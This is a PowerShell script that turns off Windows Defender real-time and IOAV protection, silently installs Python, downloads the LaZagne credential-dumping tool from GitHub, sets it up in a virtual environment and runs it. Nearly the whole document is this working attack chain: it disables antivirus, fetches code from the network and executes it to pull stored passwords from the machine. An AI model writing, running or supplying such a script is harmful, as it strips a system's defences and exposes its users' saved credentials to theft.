# ---------------------------
# Determine script root
# ---------------------------
$scriptRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }

# ---------------------------
# Turning off Windows Defender
# ---------------------------
Write-Host "Turning off Windows Defender real-time protection..."
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableIOAVProtection $true
    Write-Host "AV disabled successfully."
} catch {
    Write-Warning "Could not disable AV. Make sure you are running as Administrator. $_"
}
#---------------------------
# Python Install
# --------------------------
# ---------------------------
# Python Check + Install
# ---------------------------
Write-Host "`nChecking for Python installation..."

# Try to get python version safely
try {
    $pythonVersion = python --version 2>$null
} catch {
    $pythonVersion = $null
}

if ($pythonVersion) {
    Write-Host "Python is already installed: $pythonVersion"
} else {
    Write-Host "Python not found. Installing via winget..."

    $wingetArgs = @(
        "install",
        "--id", "9NQ7512CXL7T",               # Python from Microsoft Store
        "--silent",
        "--accept-package-agreements",
        "--accept-source-agreements"
    )

    Start-Process "winget" -ArgumentList $wingetArgs -Wait

    # Re-check after install
    try {
        $pythonVersion = python --version 2>$null
    } catch {
        $pythonVersion = $null
    }

    if ($pythonVersion) {
        Write-Host "Python installed successfully: $pythonVersion"
    } else {
        Write-Warning "Python did not install correctly or PATH has not refreshed."
    }
}

# ---------------------------
# Download LaZagne
# ---------------------------
$laZagneZip = Join-Path $scriptRoot "LaZagne.zip"
$destPath = Join-Path $scriptRoot "LaZagne"

Write-Host "`nDownloading LaZagne..."
try {
    Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/archive/refs/heads/master.zip" -OutFile $laZagneZip
    Expand-Archive $laZagneZip -DestinationPath $destPath -Force
    Remove-Item $laZagneZip -Force
    Write-Host "LaZagne downloaded and extracted to $destPath"
} catch {
    Write-Error "Error downloading or extracting LaZagne: $_"
    return
}

# ---------------------------
# Locate Windows folder and Python script
# ---------------------------
$windowsFolder = Join-Path $destPath "LaZagne-master\Windows"
$pyScriptName = "laZagne.py"

if (-not (Test-Path $windowsFolder)) {
    Write-Error "Windows folder not found at $windowsFolder. Extraction may have failed."
    return
}

$pyScript = Get-ChildItem -Path $windowsFolder -Filter $pyScriptName -File -ErrorAction SilentlyContinue |
            Select-Object -First 1

if ($null -eq $pyScript) {
    Write-Error "Python script '$pyScriptName' not found in the Windows folder!"
    return
}

Write-Host "Found Python script at $($pyScript.FullName)"

# ---------------------------
# Setup virtual environment
# ---------------------------
$venvPath = Join-Path $scriptRoot "venv"

if (-not (Test-Path $venvPath)) {
    Write-Host "Creating virtual environment..."
    python -m venv $venvPath
} else {
    Write-Host "Virtual environment already exists."
}

# ---------------------------
# Activate virtual environment
# ---------------------------
$activateScript = Join-Path $venvPath "Scripts\Activate.ps1"
if (-not (Test-Path $activateScript)) {
    Write-Error "Virtual environment activation script not found!"
    return
}

Write-Host "Activating virtual environment..."
. $activateScript

# ---------------------------
# Install requirements if present
# ---------------------------
if ($windowsFolder -and (Test-Path $windowsFolder)) {
    $requirementsFile = Join-Path $windowsFolder "requirements.txt"
    if (Test-Path $requirementsFile) {
        Write-Host "Installing dependencies from requirements.txt..."
        pip install --upgrade pip
        pip install -r $requirementsFile
    } else {
        Write-Host "No requirements.txt found."
    }
} else {
    Write-Warning "Windows folder path is invalid. Skipping requirements installation."
}

# ---------------------------
# Run the Python script
# ---------------------------
Write-Host "`nRunning Python script..."
try {
    python $pyScript.FullName
} catch {
    Write-Error "Failed to run Python script: $_"
}


